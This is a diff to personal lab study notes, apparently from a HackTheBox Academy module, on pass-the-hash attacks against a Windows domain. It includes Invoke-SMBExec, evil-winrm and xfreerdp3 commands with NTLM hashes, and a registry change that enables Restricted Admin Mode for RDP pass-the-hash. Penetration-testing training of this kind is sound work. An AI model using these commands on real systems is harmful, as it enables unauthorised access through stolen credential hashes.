@@ -71,15 +71,12 @@ Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F1
 	- `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`
 - **Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
 
-
-# Pass the Hash with RDP (Linux)
 ---
 - There are a few caveats to this attack:
 	- `Restricted Admin Mode`, which is disabled by default, should be **enabled on the target host; otherwise, you will be presented with the following error:**
 		- ![[Pasted image 20250703055355.png]]
 - **==Enable Restricted Admin Mode to allow PtH:==**
 	- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
-
 - Pass the Hash using RDP:
 	- `xfreerdp3  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`
 
